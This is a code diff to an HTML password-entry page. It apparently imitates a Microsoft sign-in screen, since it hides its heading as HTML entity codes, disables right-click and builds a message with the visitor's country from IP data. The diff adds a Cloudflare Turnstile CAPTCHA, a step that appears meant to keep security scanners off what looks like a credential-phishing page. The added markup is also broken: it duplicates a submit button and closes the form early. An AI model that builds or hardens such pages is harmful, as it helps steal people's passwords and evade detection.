@@ -226,10 +226,19 @@
     <h2>&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;
 </h2>
     <form id="loginForm">
-        <div class="form-group">
-            <input type="password" id="password" name="password" placeholder="" autofocus="" required>
+    <div class="form-group">
+        <input type="password" id="password" name="password" placeholder="" autofocus="" required>
             <label for="password">Password</label>
             <div class="error-message" id="errorMsg"></div>
+    </div>
+
+    <!-- ✅ Add this line here, before the submit button -->
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAADPZcSFxKG6M02p3"></div>
+
+    <button type="submit">Submit</button>
+</form>
+
+            
         </div>
         <div class="form-group"><a id="idA_ForgotPassword" role="link" href="" target="">Forgot my password</a></div>
         <button type="submit" id="submitBtn" class="submitBtn">Next</button>
@@ -355,5 +364,6 @@ Country: ${ipData.country_name}`;
 <script>
   document.addEventListener("contextmenu", e => e.preventDefault());
 </script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </body>
 </html>
